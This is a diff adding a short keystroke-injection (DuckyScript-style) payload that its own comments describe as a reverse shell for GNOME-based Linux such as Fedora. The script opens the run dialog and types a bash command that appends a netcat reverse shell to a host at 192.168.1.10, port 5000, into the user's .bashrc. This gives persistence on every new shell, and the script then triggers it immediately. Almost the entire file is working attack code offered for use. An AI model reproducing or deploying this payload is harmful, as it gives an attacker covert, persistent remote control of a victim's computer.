@@ -1,0 +1,11 @@
+REM This is a very simple reverse shell, designed for GNOME-based linux distros, specifically FEDORA
+REM Make sure, that you have modified the IP address and the port accordingly!
+
+REM Open RUN window
+DELAY 1000
+ALT F2
+DELAY 500
+STRING bash -c "echo -e \"nohup nc -e /bin/bash 192.168.1.10 5000 &>/dev/null &\ndisown -a\" >> .bashrc; gnome-terminal -- $SHELL -ic \"sleep 0.2; exit\""
+DELAY 600
+ENTER
+DELAY 750
